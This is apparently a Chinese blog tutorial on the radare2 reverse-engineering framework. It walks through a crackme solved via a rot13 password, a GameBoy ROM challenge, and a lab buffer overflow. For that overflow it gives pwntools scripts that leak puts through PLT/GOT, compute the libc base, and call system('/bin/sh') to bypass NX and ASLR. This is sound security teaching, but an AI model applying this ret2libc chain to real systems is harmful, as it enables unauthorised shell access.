    <content type="html"><![CDATA[<h1 id="Radare入门到进阶"><a href="#Radare入门到进阶" class="headerlink" title="Radare入门到进阶"></a>Radare入门到进阶</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在 radare2 界面或者单独被使用–比如我们将要在接下来实验中使用到的rahash2, rabin2, ragg2三个组件，所有这些组件赋予了 radare2 强大的静态以及动态分析、十六进制编辑以及溢出漏洞挖掘的能力。</p><p>Kali已经自带radare2</p><p>我们可以输入-h查看帮助，i开头的命令主要用来获取各种信息，A系列的命令用于分析文件</p><p><img src="/.io//image-20240210115155347.png" alt="image-20240210115155347"></p><p><img src="/.io//image-20240210115210174.png" alt="image-20240210115210174"></p><p><img src="/.io//image-20240210115224693.png" alt="image-20240210115224693"></p><p>r2 框架里最强的一个工具 ：rabin2.</p><p>rabin2 可以获取包括ELF, PE, Mach-O, Java CLASS文件的区段、头信息、导入导出表、字符串相关、入口点等等，并且支持几种格式的输出文件.我们可以使用它来获取二进制文件的基本信息</p><p>输入man rabin2查看更多用法。对于反汇编，我们可以输入vv进入图形化界面。输入q则可以退出图形化界面，回到shell</p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>首先rabin2加上-I 参数 来让 rabin2 打印出二进制文件的系统属性、语言、字节序、框架、以及使用了哪些 加固技术</p><p><img src="/.io//image-20240210115622138.png" alt="image-20240210115622138"></p><p>我们可以看到这是一个32位的 elf 文件，没有剥离符号表并且是动态链接的</p><p>接下来我们尝试运行它</p><p><img src="/.io//image-20240210115723007.png" alt="image-20240210115723007"></p><p>可以看到，不论是否加参数都会显示wrong。</p><p>接下来我们使用radare2来进行破解。</p><p><img src="/.io//image-20240210115845205.png" alt="image-20240210115845205"></p><p>看到黄色字体输出了一个地址 (0x08048370)，这就是它自动识别的程序入口点，或者我们也可以使用ie命令手动打印出入口点。</p><p>接下来输入aa或者aaa进行细致的分析</p><p><img src="/.io//image-20240210115925640.png" alt="image-20240210115925640"></p><p>分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 <flag spaces>，一个 flag 是所有类似特征的集合</flag></p><p>接下来我们看看所有的flag</p><p><img src="/.io//image-20240210115958812.png" alt="image-20240210115958812"></p><p>我们打印出imports下面的信息</p><p><img src="/.io//image-20240210120028466.png" alt="image-20240210120028466"></p><p>为了获取更多的信息，我们可以再列出数据段里的字符串</p><p><img src="/.io//image-20240210120055994.png" alt="image-20240210120055994"></p><p>出现了关键字，一个是success，一个是我们之前运行时的wrong….。那我们接下来就跟着success走，看看哪儿进行了调用</p><p>输入命令axt @@ str.*，并使用afl列出分析到的函数</p><p>‘axt’ 命令用来在 data&#x2F;code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.</p><p>‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）</p><p>‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p><p>接下来我们看看radare2分析出来哪些函数</p><p><img src="/.io//image-20240210120506254.png" alt="image-20240210120506254"></p><p>看到两个引起我们注意的sym.beet和sym.rot13</p><p>接下来我们用 ‘s main’ 指令定位到main函数入口处，然后用 ‘pdf’输出反汇编代码</p><p><img src="/.io//image-20240210120612639.png" alt="image-20240210120612639"></p><p>分析函数的执行流程，我们知道二进制程序是通过获取 beet函数的返回结果来判断是否正确</p><p>输入<a href="mailto:&#112;&#100;&#x66;&#64;&#x73;&#x79;&#x6d;&#x2e;&#x62;&#101;&#101;&#x74;">&#112;&#100;&#x66;&#64;&#x73;&#x79;&#x6d;&#x2e;&#x62;&#101;&#101;&#x74;</a>定位到反汇编</p><p><img src="/.io//image-20240210120706294.png" alt="image-20240210120706294"></p><p><img src="/.io//image-20240210120834756.png" alt="image-20240210120834756"></p><p>我们看到输入的参数被拷贝到了一个缓存空间里，这个空间的地址是 ‘ebp – local_88h’ 。 ‘local_88h’ 就是十进制的 136。由于4个字节会被用来保存 ebp 的地址，4个字节被用来保存返回地址，所以这个缓冲区得大小是 128个字节.它们加起来刚好是 136. 我们输入的参数被拷贝到缓冲区后被用来和 sym.rot13的返回结果作对比， <strong>Rot-13</strong> 是一个著名的替换密码算法，在ctf和crackme中被广泛使用，这个函数接受了9个十六进制值作为参数，但是上图中看起来r2好像没有识别出来到底是什么字符，这里我们需要用 ‘ahi s’ 来做些处理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ahi s @@=0x080485a3 0x080485ad 0x080485a7</span><br></pre></td></tr></table></figure><p>ahi s 是用来设置字符串特定的偏移地址（使用 ahi? 获取更多用法），@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后，图形视图会自动刷新。重新运行<a href="mailto:&#x70;&#x64;&#102;&#x40;&#115;&#121;&#109;&#46;&#x62;&#101;&#101;&#116;">&#x70;&#x64;&#102;&#x40;&#115;&#121;&#109;&#46;&#x62;&#101;&#101;&#116;</a></p><p><img src="/.io//image-20240210121257193.png" alt="image-20240210121257193"></p><p>可以看到之前无法识别的字符串’Megabeets’(根据字节序反向压栈顺序得到)。这个二进制文件将我们传入的参数来和经过 rot13 处理后的 ‘Megabeets’ 作比较</p><p>接下来我们通过rahash2求出这个字符串的校验值</p><p><img src="/.io//image-20240210121407504.png" alt="image-20240210121407504"></p><p>至此，程序的逻辑就很清楚了：</p><p>‘Zrtnorrgf’ 就是用来和我们输入的字符串作比较，成功则返回success</p><p>接下来输入ood?进入调试模式</p><p>将Zrtnorrgf作为参数进行调试</p><p>输入dc查看结果</p><p><img src="/.io//image-20240210121546310.png" alt="image-20240210121546310"></p><p>输出了success，我们成功破解了这个小软件，也借此掌握了radare2的基本用法</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>常用命令：</p><p>   信息搜集:</p><p>​    $ rabin2 -I .&#x2F;program — 查看二进制信息</p><p>   ii [q] – 查看导出表</p><p>   ?v sym.imp.func_name — 获取过程链接表中相应函数的地址（func_name@PLT）</p><p>   ?v reloc.func_name —获取全局偏移表中函数的地址（func_name@GOT）</p><p>   ie [q] — 获取入口点地址</p><p>   内存相关：</p><p>   dmm — 列出模块 (库文件，内存中加载的二进制文件)</p><p>   dmi [addr|libname] [symname] — 列出目标库的符号标识</p><p>   搜索：</p><p>   &#x2F;?— 列出搜索子命令 </p><p>   &#x2F; string — 搜索内存&#x2F;二进制文件的字符串</p><p>   &#x2F;R [?] —搜索ROP gadgets</p><p>   &#x2F;R&#x2F; — 使用正则表达式搜索ROP gadgets</p><p>   调试：</p><p>   dc — 继续执行</p><p>   dcu addr – 继续执行直到到达指定地址</p><p>   dcr — 继续执行直到到达ret (使用步过step over)</p><p>   dbt [?] —基于 dbg.btdepth 和 dbg.btalgo显示backtrace追踪函数</p><p>   doo [args] — 添加参数重新打开调试模式</p><p>   ds — 步入一条指令（step on）</p><p>   dso — 步过（Step over）</p><p>Visual Modes</p><p>   pdf @ addr — 打印出相应偏移处的函数的汇编代码</p><p>   V —视图模式,使用p&#x2F;P to在不同模式间切换</p><p>本实验的重点是exp的开发，将使用radare 2绕过启用ASLR的系统上的NX保护的二进制文件，并进行exp的开发。</p><p>拿到小程序后，我们首先使用rabin2查看文件相关信息</p><p><img src="/.io//image-20240210122304648.png" alt="image-20240210122304648"></p><p>由上图可以看到二进制文件是NX保护的，这意味着我们不会有一个可执行的堆栈依赖。这就加大了我们写exp的难度，同样，这也给我们的学习与挑战带来了乐趣。</p><p>现在我们来看看程序的反汇编。我们先以调试模式打开，然后对符号、函数进行分析</p><p><img src="/.io//image-20240210122829057.png" alt="image-20240210122829057"></p><p> 接下来继续执行，直到到达main函数</p><p><img src="/.io//image-20240210122854521.png" alt="image-20240210122854521"></p><p>  接下来我们使用vv进入图形化模式</p><p><img src="/.io//image-20240210123817194.png" alt="image-20240210123817194"></p><p>   我们可以看到main()函数中通过scanf()帮助我们输入，然后将输入值传递给sym.beet，因此定位到处理我们输入的beet函数。按q退出vv模式</p><p><img src="/.io//image-20240210123158664.png" alt="image-20240210123158664"></p><p> 我们可以看到，用户的输入[arg_8h]被复制到了缓冲区[local_88h]，然后正如我们在上一个radare2入门实验中看到的一样,字符串Megabeets将会通过rot13加密，加密后的结果将会与我们的输入进行比较。</p><p>此处存在的漏洞是：程序不检查输入的大小，并将输入复制到缓冲区。这意味着，如果我们输入一个大于缓冲区大小的输入，就会导致缓冲区溢出并破坏堆栈</p><p>接下来我们来看看我们的exp该怎么编写。</p><p>   我们的目标是在系统上得到一个shell。首先，我们需要验证确实存在一个易受攻击的函数，然后，我们将找到有效负载覆盖堆栈的偏移量。</p><p>   我们使用radare2的一个框架ragg2, ragg2允许我们生成一个名为deBruijn序列的循环模式，并检查有效负载覆盖缓冲区的确切偏移量。</p><p><img src="/.io//image-20240210124026111.png" alt="image-20240210124026111"></p><p> 接下来我们要做三件事情：</p><p>   1.使用ragg2将De Bruijn模式的文件写入</p><p>   2.创建rarun2配置文件和设置输出文件作为标准输入</p><p>vim profile.rr2</p><p><img src="/.io//image-20240210124258237.png" alt="image-20240210124258237"></p><p>   3.让radare2自动找到偏移值</p><p><img src="/.io//image-20240210124743090.png" alt="image-20240210124743090"></p><p>我们执行了我们的二进制文件，并通过rarun2传递了pattern.txt的内容到stdin，并收到了信号量11</p><p><img src="/.io//image-20240210124819281.png" alt="image-20240210124819281"></p><p>我们注意到提示指向0x41417641？这是一个无效的地址，代表“AvAA”（ascii），这是我们前面生成的模式的一部分。</p><p><img src="/.io//image-20240210125135227.png" alt="image-20240210125135227"></p><p>由上图可以知道140个字节后将会出现返回地址的覆盖，我们可以开始制作我们的payload了。</p><p>前面提到我们的机器受ASLR保护所以我们不能预测地址，libc将加载到内存并且地址会发生变换。此外，我们的二进制程序开启NX，这意味着栈是不可执行的，我们不能仅仅把shellcode写入堆栈，跳转到它来执行。虽然这些保护阻止我们使用一些技术开发exp，但它们并不是绝对有效的，我们可以很容易地制造出其他的payload绕过它们</p><p>   我们再次以调试模式打开二进制文件，并查看库和它使用的函数。</p><p><img src="/.io//image-20240210125246324.png" alt="image-20240210125246324"></p><p>我们已经看到了puts和scanf了，我们可以利用这两个函数来创建一个完美的漏洞。我们的exp的编写基于以下的逻辑：我们可以控制该程序的流程，将尝试执行系统（“&#x2F;bin&#x2F;sh”）从而弹出一个shell。</p><p>因此我们需要完成以下几件事情：</p><p>   1.泄露puts的真实地址</p><p>   2.计算libc的基址</p><p>   3.计算system的地址</p><p>   4.找到包含&#x2F;bin&#x2F;sh字符串的libc的地址</p><p>   5.使用&#x2F;bin&#x2F;sh进行系统调用，并且拿到shell</p><p> 先来看看我们exp的框架（exploit1.py）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add</span></span><br><span class="line">puts_plt = </span><br><span class="line">puts_got = </span><br><span class="line">entry_point = </span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#open process</span></span><br><span class="line">    p = process(<span class="string">&quot;./megabeets_0x2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain = p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line">   payload = payload + ropchain</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">&quot;puts is at: 0x%x&quot;</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们需要填入的就是puts_plt , puts_got , entry_point 三个地址</p><p>我们将利用radare2找到这三个地址</p><p><img src="/.io//image-20240210133151857.png" alt="image-20240210133151857"></p><p>?v sym.imp.puts命令的意思是获取puts函数在PLT中的地址，接下来获取puts_20在GOT中的地址与程序入口</p><p><img src="/.io//image-20240210133348092.png" alt="image-20240210133348092"></p><p>填入exp，执行</p><p><img src="/.io//image-20240210133613652.png" alt="image-20240210133613652"></p><p>我们执行了三遍，可以看到每次执行后的puts的地址都会发生变化。因此我们不能提前预测地址。现在我们需要找到puts在libc中的偏移，然后计算lib的基址。之后我们根据基址然后使用对应的偏移来计算出system,exit,”&#x2F;bin&#x2F;sh”的真实地址。</p><p>Exp（exploit.py）的框架是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add</span></span><br><span class="line">puts_plt = </span><br><span class="line">puts_got = </span><br><span class="line">entry_point = </span><br><span class="line"></span><br><span class="line"><span class="comment">#Offsets</span></span><br><span class="line">offset_puts = </span><br><span class="line">offset_system = </span><br><span class="line">offset_exit = </span><br><span class="line">offset_str_bin_sh = </span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#open process</span></span><br><span class="line">    p = process(<span class="string">&quot;./megabeets_0x2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain = p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line">   payload = payload + ropchain</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">&quot;puts is at: 0x%x&quot;</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">&quot;system is at: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;/bin/sh is at: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">&quot;exit is at: 0x%x&quot;</span> % exit_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#build 2nd payload</span></span><br><span class="line">    payload2 = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain2 = p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    ropchain2 += p32(binsh_addr)</span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)   </span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">&quot;Here comes the shell!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们接下来的任务就是使用radare2找到偏移量</p><p><img src="/.io//image-20240210134908119.png" alt="image-20240210134908119"></p><p><img src="/.io//image-20240210135734579.png" alt="image-20240210135734579"></p><p><img src="/.io//image-20240210135759122.png" alt="image-20240210135759122"></p><p>填充后，成功拿到shell</p><p><img src="/.io//image-20240210140034709.png" alt="image-20240210140034709"></p><p>我们回顾下这次实验中是如何pwn的：</p><p>   主要分为两个阶段。</p><p>   第一个阶段，我们需要：140字节的填充，PLT中puts的地址，入口点，GOT中puts的地址。</p><p>   目的：泄露puts的地址。通过多次执行，发现中put的地址是改变的，即我们事先不能预测它的地址，所以为了获取真实地址我们必须通过偏移量，基址进行计算得到。</p><p>   对应我们的脚本 exploit1.py</p><p>   第二个阶段，我们需要：140字节的填充，system@libc,exit@libc,&#x2F;bin&#x2F;sh地址</p><p>   对应我们的脚本exploit.py</p><p>   目的：计算偏移，基址获取关键函数的真实地址，从而系统调用拿到shell</p><p>   总结一下，关键的步骤：多次泄露puts的地址-》发现地址随机，无法事先预测地址-》计算偏移，基址来获取关键函数调用真实地址-》拿到shell</p><h2 id="进阶-1"><a href="#进阶-1" class="headerlink" title="进阶"></a>进阶</h2><p>本实验旨在通过radare2来解决GameBoy ROM挑战的一个项目：simple.gb</p><p>首先我们在radare2打开二进制文件，检查它的架构、格式（i命令给出关于二进制文件的信息，~是r2内部的grep命令）</p><p><img src="/.io//image-20240210141758683.png" alt="image-20240210141758683"></p><p>由上图可以看出这是一个GameBoy的ROM，那么在阅读了它的一些指令集之后我们该去完成这次挑战了</p><p>安装模拟器并测试，发现失败后有字符FAIL</p><p>回到kali，查看FAIL地址（izzq会打印出存在于整个二进制文件中的字符串）</p><p><img src="/.io//image-20240210141931919.png" alt="image-20240210141931919"></p><p>pd打印反汇编代码并查找对应的位置</p><p><img src="/.io//image-20240210142035016.png" alt="image-20240210142035016"></p><p>我们可以看到在0x2e4引用，所以我们搜索这个地址，并打印该函数：（s addr 用于定位到某个地址，pdf用于打印出反汇编函数）</p><p><img src="/.io//image-20240210142133980.png" alt="image-20240210142133980"></p><p>我们可以看到，radare2识别出我们的函数从0x274开始。在底部有一些比较操作，然后跳转到失败的消息或者其他消息（字符串在0x02ee），我们去那儿看看。（ps意思是打印字符串，@是一个临时搜索）</p><p><img src="/.io//image-20240210142348760.png" alt="image-20240210142348760"></p><p>我们找到了win</p><p>那么我们给0x274重命名为check_input，然后开始分析</p><p><img src="/.io//image-20240210142835655.png" alt="image-20240210142835655"></p><p>VV需要大写</p><p><img src="/.io//image-20240210142952910.png" alt="image-20240210142952910"></p><p>可以看到，函数结合了很多跳转和if条件语句</p><p>我们发现函数检查每个数字，并将其与正确的比较。在左边我们可以看到有效数字。让我们快速查看这些块。我们使用p在不同视图之间再次切换，直到达到常规图形模式。</p><p><img src="/.io//image-20240210143034616.png" alt="image-20240210143034616"></p><p>简单地看了一下，大概地明白程序的意思了：二进制程序检查是否每个位置上的数字都与特定的值相等。使用cmp imm命令按照这个顺序:3,7,5,1,9检查。</p><p><img src="/.io//image-20240210143414426.png" alt="image-20240210143414426"></p><p>再仔细分析汇编，</p><p>在第一个块中，0x4被移动到hl（ld指令)，而hl又移动到寄存器bc，然后bc中引用的值与0x3进行比较。bc指向我们的输入，因此此处的检查功能检查bc+4是否等于0x3。在下一个块中，我们可以看到返回到其原始值的bc现在增加了两次(Inc)（bc+2），它所引用的值与0x7进行了比较。在示例的最后一个块中，bc返回其初始值，然后递增一次，其引用值与0x5比较。</p><p>那么逻辑就应该是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span> (guess):   </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> guess[<span class="number">4</span>]==<span class="number">3</span> <span class="keyword">and</span> guess[<span class="number">2</span>]==<span class="number">7</span> <span class="keyword">and</span> guess[<span class="number">1</span>]==<span class="number">5</span> andguess[<span class="number">3</span>]==<span class="number">1</span> <span class="keyword">and</span> guess[<span class="number">0</span>]==<span class="number">9</span>:</span><br><span class="line"></span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;WIN!&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">           <span class="built_in">print</span> <span class="string">&quot;FAIL!&quot;</span></span><br></pre></td></tr></table></figure><p>由上述代码代码逻辑可以看出，输入的数字作为数组排列的话，真实顺序应该为95713</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Radare入门到进阶&quot;&gt;&lt;a href=&quot;#Radare入门到进阶&quot; class=&quot;headerlink&quot; title=&quot;Radare入门到进阶&quot;&gt;&lt;/a&gt;Radare入门到进阶&lt;/h1&gt;&lt;h2 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;</summary>
      
    
    
    
    <category term="PWN" scheme="https://qianmuoy.github.io/categories/PWN/"/>
    
    
  </entry>
  
</feed>
